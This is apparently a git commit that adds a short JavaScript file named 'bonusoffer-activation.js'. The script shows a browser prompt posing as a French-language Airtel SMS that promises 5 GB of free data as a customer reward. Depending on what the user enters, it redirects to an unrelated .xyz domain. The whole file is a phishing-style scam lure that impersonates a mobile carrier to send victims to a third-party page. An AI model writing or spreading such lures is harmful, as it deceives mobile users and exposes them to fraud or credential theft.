f50d575aebc3abe965f502ea7c7ec2664ce76ec2
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-14 04:44:43 -0700

    Create bonusoffer-activation.js

---
+++ bonusoffer-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS Airtel : cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir 5 Go de données illimitées, ancienne récompense client, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/bonusoffer.html';
+}
